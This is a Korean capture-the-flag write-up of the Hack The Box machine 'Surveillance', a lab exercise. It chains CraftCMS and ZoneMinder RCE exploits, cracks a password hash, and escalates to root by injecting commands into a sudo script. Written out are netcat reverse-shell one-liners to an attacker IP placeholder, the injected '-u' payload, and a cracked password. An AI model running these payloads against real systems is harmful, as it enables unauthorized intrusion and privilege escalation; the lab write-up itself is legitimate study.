### 사용된 취약점: CraftCMS 관련 취약점(RCE), zoneminder 취약점(RCE)
### 정찰
- CraftCMS
  - CraftCMS 라는 관리 툴을 로그인 페이지에서 발견
  - source 보기에서 csrf token 발견
  - source 보기에서 CraftCMS의 버전 정보가 있음
 <br></br>
### 초기 침투
- 취약점 설명
  - data 대신 shell을 인코딩하여 넣고 보낼 경우 파서가 코드를 실행하여 결과를 출력
  - https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py에 있는 exploit 코드를 사용
    - 특정 데이터를 담아 phpinfo()를 실행하는 스크립트를 보냄
    - phpinfo() 실행으로 tmpdir과 documen_root 디렉터리를 찾음
    - tmp 디렉터리에 webshell 생성 후 imagick class를 조작하여 root 디렉터리로 이동
    - while True부분에서 명령을 실행하여 지속적으로 명령을 실행하게 함
    - f'\033[1;96m[+]\033[0m create shell.php in {tmp_dir}', f'\033[1;31m[-]\033[0m {HOST} is not exploitable.'
    - expliot code에서 a \033[1;96m[+]\033 부분은 글씨의 크기나 색깔을 설정하는 부분
  <br></br>
- web shell 실행 후
  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP here> 1234 >/tmp/f 코드를 타겟 머신에서 실행하여 완전한 shell을 획득한다
  - 내부에서 matthew와 zoneminder라는 이름을 발견했다.
  - storage에서 backups파일을 발견해서 웹 디렉터리에 넣고 wget으로 다운로드 한다.
    - cp /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip ./
    - wget surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip
      - 해당 db파일에서 matthew 계정과 패스워드 해시 값을 찾을 수 있다.
<br></br>
- 해시 값 크랙
  - hash-identifier로 종류를 확인한다.
    - sha-256과 haval-256으로 결과가 좁혀진다.
  - hashcat -m 1400 a.txt /usr/share/wordlists/rockyou.txt로 크랙을 시도
    - 나온 pw로 ssh를 이용하여 접속하여 user.txt 값을 읽는다.
<br></br>   
- matthew 말고도 zoneminder라는 것을 검색해본 결과 cctv 모니터링 소프트웨어라는 것을 알 수 있다.
<br><br>
- zoneminder
  - /etc/nginx/sites-enabled/zoneminder.conf에 127.0.0.1:8080 에서 서비스가 실행된다.
  - 접근하기 위해 포트 포워딩을 사용할 예정
    - ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb 로 포트포워딩을 한다
      - 하는 이유: local에 설치된 zonemider에 접근하기 위함
      - ssh -L [local포트]:[최종적으로 접근 할 곳] [ssh 서버 주소]
      - pw: starcraft122490
      - 이후에 브라우저에 127.0.0.1:2222 주소를 입력하여 접속한다
<br></br>
- 연결 된 후
  - 연결된 ssh 에서 버전 정보를 확인한다.
  - /usr/share/zoneminder/www/api/app/Config 에서 cat * | grep -i version을 실행하여 ZM_VERSION 1.36.32, ZM_API_VERSION 1.36.32.1 값을 확인
  - cve 2023-26035 익스플로잇 코드를 찾아 사용하여 reverse shell을 연결
    - CVE 2023-26035: RCE
    - python3 poc.py --target http://127.0.0.1:2222/ --cmd 'rm /tmp/f;cat /tmp/f|sh -i 2>&1|nc <내 ip> 4444 >/tmp/f'
  - reverse shell이 연결 된 후
    - sudo /usr/bin/zmupdate.pl -v 1.19.0 -u root를 실행 할 시 에러가 출력되고 에러에 pw가 포함되어 출력
    - sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';whoami; 실행 시 해당 스크립트가 root권한으로 실행되는 것을 알 수 있다
      - output으로 whoami 결과가 root로 나오기 때문
      - 파일 안에서 /bin/sh로 실행됨
      - mysql 커맨드를 실행하는 코드가 존재
    - sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';busybox nc <my_ip> 1234 -e sh; '로 root 권한을 얻은 reverse shell을 연결한다.
    - root.txt 파일을 읽는다.
  <br></br>

### 유의해야 할 점
### htb에서 root권한 스크립트를 통한 권한상승을 많이 봄
- root권한으로 실행하거나 /bin/sh로 명령어를 실행하는 스크립트를 이용하여 권한 상승을 시도한다.
### web.config, url 재작성하는 설정파일
![gobuster](https://github.com/murphy701/security/assets/50907298/d7928a50-f34b-4116-b30e-edcddbb79780)
- gobuster 사용 시 p1, p2 같은 결과를 얻음
- 해당 규칙이 설정 파일에서 url을 재정의 함
  - ##<action type=Rewrite" url="index.php?p={R:1}" appendQueryString="true" />
  - 필터링이 목적인 것으로 추측함
### 설정파일을 읽는 것을 공부하여 버전 정보 확인이나 권한 상승에 이용
### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f
- reverse shell 연결 때 많이 보이는 명령어
  - rm /tmp/f;: tmp 안에 f라는 이름이 있는 파일을 모두 삭제
  - mkfifo /tmp/f: tmp안에 f라는 파이프 생성
    - mkfifo: fifo는 프로세스간 통신을 허용하는 파일
  - cat /tmp/f|/bin/sh -i 2>&1: cat으로 입력을 읽고 파이프로 전달되어 새로운 shell 객체를 인터렉티브 모드(-i)로 실행, 그 후 output과 error를 출력으로 보냄
  - nc 1234 >/tmp/f: nc로 연결 설정 후 수신된 데이터를 /tmp/f로 리디렉션
